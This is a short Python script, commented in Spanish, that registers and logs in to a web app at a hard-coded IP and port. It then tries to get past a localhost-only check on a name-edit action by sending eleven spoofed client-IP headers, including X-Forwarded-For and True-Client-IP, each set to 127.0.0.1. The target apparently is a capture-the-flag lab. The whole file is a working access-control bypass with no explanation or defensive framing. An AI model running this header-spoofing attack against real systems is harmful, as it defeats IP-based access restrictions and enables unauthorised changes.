#!/usr/bin/env python3
"""
Intentar bypass de verificación de IP con headers
"""
import requests
import random
import string

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

session = requests.Session()
username = random_string()
password = random_string()

# Register and login
data = {'name': 'user1', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}\n")

# Intentar editar nombre directamente con bypass de IP
print("[*] Intentando bypass de verificación de IP...\n")

bypass_headers = [
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Real-IP': '127.0.0.1'},
    {'X-Originating-IP': '127.0.0.1'},
    {'X-Remote-IP': '127.0.0.1'},
    {'X-Remote-Addr': '127.0.0.1'},
    {'Client-IP': '127.0.0.1'},
    {'X-Client-IP': '127.0.0.1'},
    {'True-Client-IP': '127.0.0.1'},
    {'X-Host': '127.0.0.1'},
    {'Forwarded': 'for=127.0.0.1'},
    {'X-Forwarded-Host': '127.0.0.1'},
]

for headers in bypass_headers:
    header_name = list(headers.keys())[0]
    print(f"[*] Probando: {header_name}")
    
    data = {
        'action': 'edit',
        'new_name': 'BYPASSED'
    }
    
    resp = session.post(f"{TARGET}/", data=data, headers=headers)
    
    if "Done!" in resp.text:
        print(f"[+++] ¡SUCCESS con {header_name}!")
        print(f"[+++] El nombre debería haber cambiado")
        break
    elif "Only localhost" in resp.text:
        print(f"    [-] Rechazado (Only localhost)")
    elif "Failed!" in resp.text:
        print(f"    [-] Failed")
    else:
        print(f"    [?] Respuesta inesperada: {len(resp.text)} bytes")

# Verificar si el nombre cambió
print("\n[*] Verificando nombre actual...")
resp = session.get(f"{TARGET}/")
import re
match = re.search(r'Yo, ([^<]+)</h2>', resp.text)
if match:
    name = match.group(1)
    print(f"[*] Nombre actual: {name}")
    if name == "BYPASSED":
        print("[+++] ¡BYPASS EXITOSO!")
